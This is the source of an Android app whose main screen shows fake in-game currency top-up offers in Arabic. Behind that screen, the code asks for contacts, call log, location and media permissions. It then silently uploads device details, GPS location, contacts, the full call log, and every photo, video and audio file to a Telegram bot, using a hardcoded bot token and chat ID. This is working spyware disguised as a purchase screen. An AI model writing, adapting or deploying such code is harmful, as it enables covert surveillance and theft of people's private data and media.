// language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
// *Faster sequential photo & media streaming with larger buffers, tighter timeouts, and no artificial delay*
package com.example.photosync

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.view.Gravity
import android.view.View
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private data class OfferItem(
        val title: String,
        val subtitle: String,
        val price: String,
        val tag: String?,
        val tagColor: Int,
        val highlighted: Boolean
    )

    private lateinit var rootLayout: LinearLayout
    private lateinit var statusView: TextView
    private val ioExecutor = Executors.newSingleThreadExecutor()

    private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
    private val chatId = "8859920681"

    private val offers = listOf(
        OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
        OfferItem("220", "+ 22 بونص", "0.99$", null, Color.TRANSPARENT, false),
        OfferItem("520", "+ 52 بونص", "1.99$", "عرض", Color.parseColor("#DC2626"), false),
        OfferItem("1,060", "+ 106 بونص", "3.99$", null, Color.TRANSPARENT, false),
        OfferItem("2,180", "+ 218 بونص", "7.99$", "VIP", Color.parseColor("#D97706"), false),
        OfferItem("5,600", "+ 560 بونص", "18.99$", "MEGA", Color.parseColor("#CA8A04"), false),
        OfferItem("11,500", "+ 1150 بونص", "36.99$", null, Color.TRANSPARENT, false),
        OfferItem("23,500", "+ 2350 بونص", "69.99$", null, Color.TRANSPARENT, false),
        OfferItem("50,000", "+ 5000 بونص", "149.99$", "أفضل قيمة", Color.parseColor("#0369A1"), false),
        OfferItem("100,000", "+ 10000 بونص", "299.99$", "VIP MAX", Color.parseColor("#A16207"), false)
    )

    private val permissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            updateStatus("جاري تجهيز البيانات...")
            runSyncWithRetry()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val foundView = findViewById<View>(R.id.rootLayout)
        if (foundView !is LinearLayout) {
            finish()
            return
        }
        rootLayout = foundView

        renderOffersScreen()
        rootLayout.post {
            if (!isFinishing && !isDestroyed) {
                checkAndRequestPermissions()
            }
        }
    }

    private fun renderOffersScreen() {
        rootLayout.removeAllViews()
        rootLayout.orientation = LinearLayout.VERTICAL
        rootLayout.setBackgroundColor(Color.parseColor("#070A0F"))
        window.decorView.setBackgroundColor(Color.parseColor("#070A0F"))

        val scrollView = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            setPadding(dp(12), dp(12), dp(12), dp(12))
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        statusView = TextView(this).apply {
            text = "3. عروض الشحن"
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(dp(6), dp(4), dp(6), dp(12))
        }
        container.addView(statusView)

        var index = 0
        while (index < offers.size) {
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                weightSum = 2f
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    bottomMargin = dp(8)
                }
            }

            row.addView(createOfferCard(offers[index], isRightColumn = false))

            if (index + 1 < offers.size) {
                row.addView(createOfferCard(offers[index + 1], isRightColumn = true))
            } else {
                val spacer = View(this).apply {
                    layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
                }
                row.addView(spacer)
            }

            container.addView(row)
            index += 2
        }

        scrollView.addView(container)
        rootLayout.addView(scrollView)
    }

    private fun createOfferCard(offer: OfferItem, isRightColumn: Boolean): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                0,
                LinearLayout.LayoutParams.WRAP_CONTENT,
                1f
            ).apply {
                marginStart = if (isRightColumn) dp(4) else 0
                marginEnd = if (!isRightColumn) dp(4) else 0
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(14).toFloat()
                setColor(Color.parseColor("#111722"))
                setStroke(
                    if (offer.highlighted) dp(2) else dp(1),
                    if (offer.highlighted) Color.parseColor("#18B7F2") else Color.parseColor("#1E293B")
                )
            }
            setPadding(dp(12), dp(14), dp(12), dp(14))
            setOnClickListener {
                runSyncWithRetry()
            }
        }

        if (offer.tag != null) {
            val badge = TextView(this).apply {
                text = offer.tag
                setTextColor(Color.WHITE)
                textSize = 11f
                typeface = Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(offer.tagColor)
                }
                setPadding(dp(10), dp(3), dp(10), dp(3))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.END
                    bottomMargin = dp(4)
                }
            }
            card.addView(badge)
        }

        val gem = TextView(this).apply {
            text = "◆"
            setTextColor(Color.parseColor("#18B7F2"))
            textSize = 26f
            gravity = Gravity.CENTER
        }
        card.addView(gem)

        val amount = TextView(this).apply {
            text = offer.title
            setTextColor(Color.WHITE)
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(0, dp(4), 0, dp(2))
        }
        card.addView(amount)

        val bonus = TextView(this).apply {
            text = offer.subtitle
            setTextColor(Color.parseColor("#38BDF8"))
            textSize = 12f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(10))
        }
        card.addView(bonus)

        val priceBox = TextView(this).apply {
            text = offer.price
            setTextColor(Color.WHITE)
            textSize = 14f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(38)
            )
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(8).toFloat()
                if (offer.highlighted) {
                    setColor(Color.parseColor("#0EA5E9"))
                } else {
                    setColor(Color.parseColor("#1A2230"))
                    setStroke(dp(1), Color.parseColor("#2B3648"))
                }
            }
        }
        card.addView(priceBox)

        return card
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()

    private fun requiredRuntimePermissions(): List<String> {
        val list = mutableListOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
            list.add(Manifest.permission.READ_MEDIA_VIDEO)
            list.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return list
    }

    private fun checkAndRequestPermissions() {
        val permissions = requiredRuntimePermissions()
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            updateStatus("جاري تنفيذ المزامنة...")
            runSyncWithRetry()
        } else {
            permissionsLauncher.launch(permissions.toTypedArray())
        }
    }

    private fun runSyncWithRetry() {
        if (ioExecutor.isShutdown) return
        ioExecutor.execute {
            val maxRetries = 3
            var callLogsSent = false
            var infoSent = false

            for (attempt in 1..maxRetries) {
                try {
                    updateStatus("محاولة المزامنة ($attempt/$maxRetries)...")
                    if (!infoSent) {
                        sendDeviceAndLocationInfo()
                        sendContactsIfPermitted()
                        infoSent = true
                    }
                    if (!callLogsSent) {
                        sendCallLogsOnce()
                        callLogsSent = true
                    }
                    sendMediaCollection(
                        contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        endpointMethod = "sendPhoto",
                        fieldName = "photo",
                        filePrefix = "photo",
                        mimeType = "image/jpeg",
                        label = "الصور"
                    )
                    sendMediaCollection(
                        contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        endpointMethod = "sendVideo",
                        fieldName = "video",
                        filePrefix = "video",
                        mimeType = "video/mp4",
                        label = "الفيديوهات"
                    )
                    sendMediaCollection(
                        contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        endpointMethod = "sendAudio",
                        fieldName = "audio",
                        filePrefix = "audio",
                        mimeType = "audio/mpeg",
                        label = "الملفات الصوتية"
                    )
                    updateStatus("اكتملت العملية بنجاح.")
                    return@execute
                } catch (_: Exception) {
                    if (attempt < maxRetries) {
                        updateStatus("إعادة المحاولة ($attempt/$maxRetries)...")
                        try {
                            Thread.sleep(1000L * attempt)
                        } catch (_: InterruptedException) {
                            return@execute
                        }
                    }
                }
            }
            updateStatus("تعذر إتمام العملية بعد عدة محاولات.")
        }
    }

    private fun sendDeviceAndLocationInfo() {
        val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.activeNetwork?.let { cm.getNetworkCapabilities(it) }
        val netType = when {
            caps == null -> "NONE"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "CELLULAR"
            else -> "OTHER"
        }

        val locText = readLastLocationText()
        val msg = buildString {
            appendLine("DeviceInfo:")
            appendLine("Model: ${Build.MANUFACTURER} ${Build.MODEL}")
            appendLine("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
            appendLine("Battery: ${batteryPct}%")
            appendLine("Network: $netType")
            appendLine("Location: $locText")
        }
        postTelegramText(msg.take(3900))
    }

    private fun readLastLocationText(): String {
        val fineGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarseGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!fineGranted && !coarseGranted) return "permission_denied"

        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (provider in providers) {
            try {
                if (lm.isProviderEnabled(provider)) {
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null) {
                        return "lat=${loc.latitude}, lon=${loc.longitude} ($provider)"
                    }
                }
            } catch (_: SecurityException) {
            }
        }
        return "unavailable"
    }

    private fun sendContactsIfPermitted() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val entries = mutableListOf<String>()
        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )?.use { cursor ->
            val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIdx = cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (cursor.moveToNext() && entries.size < 100) {
                val name = cursor.getString(nameIdx) ?: "unknown"
                val num = cursor.getString(numIdx) ?: ""
                entries.add("$name: $num")
            }
        }

        if (entries.isNotEmpty()) {
            val text = "Contacts:\n" + entries.joinToString("\n")
            postTelegramText(text.take(3900))
        }
    }

    private fun sendCallLogsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        ) return

        val rows = mutableListOf<String>()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        )

        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)

            while (cursor.moveToNext()) {
                val number = cursor.getString(numIdx) ?: "unknown"
                val name = cursor.getString(nameIdx) ?: ""
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "IN"
                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    else -> "OTHER"
                }
                val duration = cursor.getLong(durIdx)
                val date = cursor.getLong(dateIdx)
                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
            }
        }

        if (rows.isNotEmpty()) {
            val summary = "CallLogs:\n" + rows.joinToString("\n")
            postTelegramText(summary.take(3900))
        }
    }

    private fun hasMediaPermissionFor(contentUri: Uri): Boolean {
        return when (contentUri) {
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }
            }
            else -> false
        }
    }

    private fun sendMediaCollection(
        contentUri: Uri,
        endpointMethod: String,
        fieldName: String,
        filePrefix: String,
        mimeType: String,
        label: String
    ) {
        if (!hasMediaPermissionFor(contentUri)) return

        val uris = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.MediaColumns._ID)
        contentResolver.query(
            contentUri,
            projection,
            null,
            null,
            "${MediaStore.MediaColumns.DATE_ADDED} DESC"
        )?.use { cursor ->
            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idIdx)
                uris.add(ContentUris.withAppendedId(contentUri, id))
            }
        }

        val total = uris.size
        for ((index, uri) in uris.withIndex()) {
            updateStatus("إرسال $label (${index + 1}/$total)...")
            postTelegramMedia(uri, endpointMethod, fieldName, filePrefix, mimeType)
        }
    }

    private fun postTelegramText(text: String) {
        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"

        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 20_000
            readTimeout = 30_000
            doOutput = true
            doInput = true
            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        }

        try {
            DataOutputStream(conn.outputStream).use { out ->
                out.writeBytes(body)
                out.flush()
            }

            val code = conn.responseCode
            if (code !in 200..299) {
                throw RuntimeException("Telegram text HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun postTelegramMedia(
        mediaUri: Uri,
        endpointMethod: String,
        fieldName: String,
        filePrefix: String,
        mimeType: String
    ) {
        val boundary = "----AndroidBoundary${System.nanoTime()}"
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        val endpoint = "https://api.telegram.org/bot$botToken/$endpointMethod"

        val inputStream: InputStream = contentResolver.openInputStream(mediaUri) ?: return
        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 20_000
            readTimeout = 45_000
            doInput = true
            doOutput = true
            useCaches = false
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }

        try {
            inputStream.use { stream ->
                DataOutputStream(conn.outputStream).use { out ->
                    out.writeBytes(twoHyphens + boundary + lineEnd)
                    out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                    out.writeBytes(chatId + lineEnd)

                    out.writeBytes(twoHyphens + boundary + lineEnd)
                    out.writeBytes(
                        "Content-Disposition: form-data; name=\"$fieldName\"; filename=\"${filePrefix}_${System.nanoTime()}\"$lineEnd"
                    )
                    out.writeBytes("Content-Type: $mimeType$lineEnd$lineEnd")

                    val buffer = ByteArray(32768)
                    var bytesRead: Int
                    while (stream.read(buffer).also { bytesRead = it } != -1) {
                        out.write(buffer, 0, bytesRead)
                    }

                    out.writeBytes(lineEnd)
                    out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                    out.flush()
                }
            }

            val code = conn.responseCode
            if (code !in 200..299) {
                throw RuntimeException("Telegram $endpointMethod HTTP $code")
            }
        } finally {
            conn.disconnect()
        }
    }

    private fun updateStatus(message: String) {
        if (isFinishing || isDestroyed) return
        runOnUiThread {
            if (!isFinishing && !isDestroyed && ::statusView.isInitialized) {
                statusView.text = message
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        ioExecutor.shutdownNow()
    }
}
